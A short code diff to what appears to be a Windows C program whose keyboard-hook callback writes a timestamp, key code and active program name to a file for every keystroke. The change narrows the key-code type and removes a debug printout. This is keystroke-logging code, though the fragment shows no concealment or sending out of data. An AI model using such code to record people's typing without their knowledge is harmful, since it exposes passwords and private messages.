@@ -35,14 +35,14 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
             }
             char *excutableName = basename(executablePath);
             uint8_t len = (uint8_t) strlen(excutableName);
+            uint8_t vkCode = (uint8_t) kbdStruct.vkCode;
 
             // printf("strs: %llu, app: %s, vk: %lu, t: %lu\n", count++, excutableName, kbdStruct.vkCode, kbdStruct.time);
             uint32_t timestamp = (unsigned) time(NULL);
             fwrite(&timestamp, sizeof(DWORD), 1, f);
-            fwrite(&kbdStruct.vkCode, sizeof(char), 1, f);
+            fwrite(&vkCode, sizeof(uint8_t), 1, f);
             fwrite(&len, sizeof(uint8_t), 1, f);
             fwrite(excutableName, sizeof(char), strlen(excutableName), f);
-            printf("%u %lu %u %s\n", timestamp, kbdStruct.vkCode, len, excutableName);
 
             count++;
             if ((count % 256) == 0) {
